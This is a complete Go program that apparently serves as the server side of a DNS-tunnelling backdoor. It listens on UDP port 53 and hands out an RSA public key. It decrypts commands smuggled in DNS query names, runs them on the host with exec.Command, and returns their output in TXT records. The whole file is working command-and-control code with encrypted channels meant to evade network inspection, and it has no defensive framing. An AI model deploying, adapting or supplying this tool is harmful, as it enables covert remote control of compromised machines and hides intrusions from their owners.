package main

import (
	"strings"
	"bytes"
	"net"
	"os/exec"
	"encoding/pem"
    "encoding/binary"
    "crypto/rsa"
    "crypto/x509"
    "crypto/sha512"
    "crypto/rand"
    "fmt"
)

func generateKeyPair(bits int) *rsa.PrivateKey {
	privkey, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		fmt.Println(err)
	}
	return privkey
}

func encryptWithPublicKey(msg []byte, pub *rsa.PublicKey) []byte {
	hash := sha512.New()
	ciphertext, err := rsa.EncryptOAEP(hash, rand.Reader, pub, msg, nil)
	if err != nil {
		fmt.Println(err)
	}
	return ciphertext
}

func decryptWithPrivateKey(ciphertext []byte, priv *rsa.PrivateKey) ([]byte, error) {
	hash := sha512.New()
	plaintext, err := rsa.DecryptOAEP(hash, rand.Reader, priv, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return plaintext, err
}

func publicKeyToBytes(pub *rsa.PublicKey) []byte {
	pubASN1, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		fmt.Println(err)
	}

	pubBytes := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: pubASN1,
	})

	return pubBytes
}

var (
	host string = "0.0.0.0"
    privkey *rsa.PrivateKey = generateKeyPair(2048)
)

func check(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	addr := net.UDPAddr{
		Port: 53,
		IP: net.ParseIP(host),
	}

	conn, err := net.ListenUDP("udp", &addr)
	check(err)
	defer conn.Close()

	var buff []byte
	for {
		buff = make([]byte, 65536)
		n, addr, err := conn.ReadFromUDP(buff)
		if err != nil {
			continue
		}

		go handleConnection(conn, buff, n, addr)
	}
}

func splitLongMessage(msg []byte) [][]byte {
    var result [][]byte
    i := 0
    for i < len(msg) {
        var size int
        if (len(msg)-i) > 254 {
            size = 254
        } else {
            size = len(msg)-i
        }
        result = append(result, msg[i:i+size])
        i += size
    }
    return result
}

func handleConnection(conn *net.UDPConn, buff []byte, n int, addr *net.UDPAddr) {
	var (
		data []byte
        pkeyReqStr string = "publickey"
		ptr int = 12
		size int = int(buff[ptr])
        responses [][]byte
        numQueries = binary.BigEndian.Uint16(buff[4:6])
	)

    if n < 12 {
        // Didn't receive a full DNS request.
        response := []byte("error")
        conn.WriteToUDP(response, addr)
        return
    }

    // Read the request.
    for size != 0 {
        ptr += 1
        data = append(data, buff[ptr:ptr+size]...)
        ptr += size
        ptr += 5
        size = int(buff[ptr])
    }

    if len(data) == len(pkeyReqStr) && bytes.Index(data[0:len(pkeyReqStr)], []byte(pkeyReqStr)) != -1 {
        // Client requests our public key.
        pubkeyBytes := publicKeyToBytes(&privkey.PublicKey)
        responses = splitLongMessage(pubkeyBytes)
    } else {
        // Decrypt message.
        decoded, err := decryptWithPrivateKey(data, privkey)
        if err != nil {
            // Failed to decrypt.
            responses = append(responses, []byte("error"))
        } else {
            // Form and run command.
            cmdArgs := strings.Fields(string(decoded))

            var out bytes.Buffer
            if len(cmdArgs) < 1 {
                return
            }
            cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
            cmd.Stdout = &out
            err = cmd.Run()

            if err != nil {
                responses = append(responses, []byte("error"))
            } else {
                responses = splitLongMessage([]byte(strings.TrimSpace(out.String())))
            }
        }
    }

    // Send our response.
	requestLength := ptr
	resp := make([]byte, requestLength)
	copy(resp[:12], []byte{buff[0], buff[1], 0x81, 0x80, 0x00, byte(numQueries), 0x00, byte(len(responses)),
	0x00, 0x00, 0x00, 0x00})
	copy(resp[12:requestLength], buff[12:])

    for _, response := range responses {
        respLen := len(response)
        answer := []byte{0xc0, 0x0c, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x13, 0x37,
        0x00, byte(respLen + 1), byte(respLen)}
        answer = append(answer, []byte(response)...)
        resp = append(resp, answer...)
    }

    _, err := conn.WriteToUDP(resp, addr)
	if err != nil {
		return
	}
}
